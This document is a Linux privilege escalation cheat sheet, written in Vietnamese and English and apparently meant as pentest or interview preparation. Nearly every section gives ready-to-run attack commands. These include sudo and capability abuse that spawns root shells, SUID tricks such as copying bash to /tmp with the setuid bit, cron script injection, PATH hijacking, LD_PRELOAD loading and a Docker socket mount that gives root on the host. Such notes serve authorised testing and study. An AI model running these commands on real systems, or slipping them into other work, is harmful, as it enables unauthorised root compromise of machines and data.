## 1️⃣ Initial posture check (baseline assessment)

```bash
whoami
id
hostname
uname -a
pwd
```

🎯 Mục tiêu: xác định **context**, **kernel**, **role hiện tại**

---

## 2️⃣ SUDO misconfiguration (Top 1 ROI)

### Enumerate

```bash
sudo -l
```

### Red flags 🚩

- `NOPASSWD`
    
- Cho phép chạy:
    
    - `python`, `perl`, `bash`, `sh`
        
    - Script trong `/home/*`
        
- Wildcard `*`
    

### Exploit patterns

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo bash
```

📌 Mapping: `T1548.003 – Abuse Sudo`

---

## 3️⃣ SUID binaries (Classic but gold)

### Find

```bash
find / -perm -4000 2>/dev/null
```

### Check GTFOBins

- `/bin/bash`
    
- `find`
    
- `vim`
    
- `less`
    
- `nmap`
    

### Example

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

📌 Nếu thấy `bash` SUID:

```bash
bash -p
```

---

## 4️⃣ Writable files / scripts run as root

### Hunt writable

```bash
find / -writable -type f 2>/dev/null
```

### Common targets

- `/etc/*.sh`
    
- backup scripts
    
- cron scripts
    

### Payload mẫu

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

➡️ Sau đó:

```bash
/tmp/rootbash -p
```

---

## 5️⃣ Cron jobs abuse

### Enumerate

```bash
crontab -l
ls -la /etc/cron*
```

### Red flags 🚩

- Script chạy root
    
- File writable bởi user
    

### Exploit

Inject command vào script → chờ cron trigger → root

📌 Mapping: `T1053 – Scheduled Task`

---

## 6️⃣ PATH hijacking

### Check sudo / script

```bash
echo $PATH
```

Nếu script gọi:

```bash
tar
cp
date
```

👉 Tạo binary giả:

```bash
echo "/bin/bash" > tar
chmod +x tar
export PATH=.:$PATH
```

---

## 7️⃣ Environment variable abuse

### LD_PRELOAD (nếu sudo cho phép)

```bash
sudo LD_PRELOAD=/tmp/shell.so /bin/ls
```

📌 Cần:

- Binary không bị `secure_path`
    
- Không set `noexec`
    

---

## 8️⃣ Capabilities (modern Linux)

### Enumerate

```bash
getcap -r / 2>/dev/null
```

### Dangerous

- `cap_setuid`
    
- `cap_sys_admin`
    

### Example

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 9️⃣ Docker / container breakout

### Check

```bash
groups
ls /var/run/docker.sock
```

### If writable

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

🎯 Root on host

---

## 🔟 Kernel exploit (last resort)

### Enumerate

```bash
uname -a
cat /etc/os-release
```

### Tools

- `linpeas.sh`
    
- `linux-exploit-suggester`
    

⚠️ High risk – noisy – unstable

---

## 1️⃣1️⃣ Shell upgrade (post-priv-esc hygiene)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

🎯 Dùng được ← → ↑ ↓, nano, less

---

## 🧠 Mental model (rất quan trọng)

Hỏi liên tục:

- **Ai chạy cái này?**
    
- **Chạy bằng quyền gì?**
    
- **Tôi ghi được vào đâu?**
    
- **Có interpreter không?**
    

Nếu trả lời được → **priv esc gần như chắc chắn**.

---

## 🎤 One-liner “ăn điểm”

> _“I escalated privileges by abusing a sudo misconfiguration that allowed execution of a root-level script, leading to SUID binary creation and full root compromise.”_

---